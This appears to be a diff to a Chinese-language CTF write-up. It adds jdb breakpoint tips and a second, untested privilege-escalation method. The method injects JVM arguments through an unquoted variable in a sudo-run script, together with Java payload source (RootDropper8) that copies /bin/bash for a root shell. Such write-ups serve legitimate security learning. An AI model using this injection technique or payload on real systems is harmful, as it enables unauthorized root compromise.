@@ -333,6 +333,8 @@ Listening for transport dt_socket at address: 8001
 正在初始化jdb...
 
 VM 已启动: > 当前调用堆栈上没有帧
+#这里可以利用where、threads、list、locals看可以停在哪
+#java.io.PrintStream.println(java.lang.String)大部分代码中都有
 
 main[1] stop in java.io.PrintStream.println(java.lang.String)
 设置断点java.io.PrintStream.println(java.lang.String)
@@ -355,6 +357,52 @@ bash-5.0# cat /root/root.txt
 flag{ilikeyou,too,Mizore}
 ```
 
+## 另一种提权
+攻击者构造恶意 jar，并通过参数注入将其加载到 JVM 扩展路径，从而执行任意代码实现提权
+
+这个前三⾏提取tmp的第⼀⾏作为后续启动的参数，查了下basename的命令，这⾥使⽤basename的时候没有加引号，后⾯的启动命令⾥这个 $file_line 也没加，tmp⼜可控，可以直接利⽤
+在tmp前⾯加上： -a libhprof.so -Djava.ext.dirs=file RootDropper8 ，给他拼成： basename -a libhprof.so -Djava.ext.dirs=file RootDropper8 ，basename
+
+会以空格为界，加上换⾏符，拼成： file_line=$'libhprof.so\n-Djava.ext.dirs=file\nRootDropper8'最后的启动命令：
+```bash
+usr/local/java/jdk1.8.0_20/bin/java \
+-agentpath:/usr/local/java/jdk1.8.0_20/jre/lib/amd64/libhprof.so \
+-Djava.ext.dirs=file \
+RootDropper8 \
+test
+```
+RootDropper8：
+```java
+import java.io.IOException;
+public class RootDropper8 {
+    static {
+        run();
+    }
+    public static void main(String[] args) {
+        run();
+    }
+    private static void run() {
+        String[] commands = {
+            "/bin/sh",
+            "-c",
+            "cp /bin/bash /home/bluebird/rootsh"
+        };
+        try {
+            new ProcessBuilder(commands)
+                .redirectErrorStream(true)
+                .start()
+                .waitFor();
+        } catch (IOException | InterruptedException ignored) {
+            Thread.currentThread().interrupt();
+        }
+    }
+}
+```
+在tmp后⾯加上jar，让jvm去解析后⾯的类：
+```java
+cat /tmp/payload.jar >> /opt/file/tmp
+```
+最后运行就行。sudo /bin/bash /opt/java_agent_start.sh.第二种我没试了
 ## 一图流
 ```
 [信息收集]  
